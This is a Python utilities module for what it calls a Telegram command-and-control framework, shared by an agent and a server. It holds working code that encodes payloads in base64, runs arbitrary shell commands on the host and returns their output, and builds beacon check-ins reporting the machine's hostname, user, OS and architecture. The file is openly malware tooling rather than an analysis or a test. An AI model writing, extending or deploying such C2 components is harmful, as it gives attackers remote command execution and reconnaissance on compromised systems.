# c2_frameworks/telegram/utils.py
"""
Shared utilities for Telegram C2 (agent & server)
"""

import base64
import json
import subprocess
import secrets
from datetime import datetime
from typing import Dict, Any


def generate_session_id() -> str:
    """Generate a secure random session ID"""
    return secrets.token_hex(8)


def encode_payload(data: Dict[str, Any]) -> str:
    """Encode JSON payload to base64 (for transmission)"""
    json_str = json.dumps(data)
    return base64.b64encode(json_str.encode()).decode()


def decode_payload(encoded: str) -> Dict[str, Any]:
    """Decode base64 payload back to JSON dict"""
    try:
        json_str = base64.b64decode(encoded).decode()
        return json.loads(json_str)
    except Exception as e:
        raise ValueError(f"Failed to decode payload: {e}")


def execute_command(command: str) -> str:
    """Execute system command safely with timeout"""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=180  # 3-minute timeout
        )
        output = result.stdout.strip()
        if result.stderr:
            output += f"\n\n[STDERR]\n{result.stderr.strip()}"
        return output if output else "Command executed (no output)"
    except subprocess.TimeoutExpired:
        return "Error: Command timed out after 180s"
    except Exception as e:
        return f"Execution error: {str(e)}"


def build_beacon_payload(session_id: str, hostname: str = None, user: str = None) -> Dict:
    """Build standard beacon check-in payload"""
    import platform
    import os

    if not hostname:
        hostname = platform.node()
    if not user:
        user = os.getenv("USER") or os.getenv("USERNAME") or "unknown"

    return {
        "type": "beacon",
        "session_id": session_id,
        "hostname": hostname,
        "user": user,
        "platform": platform.system(),
        "architecture": platform.machine(),
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }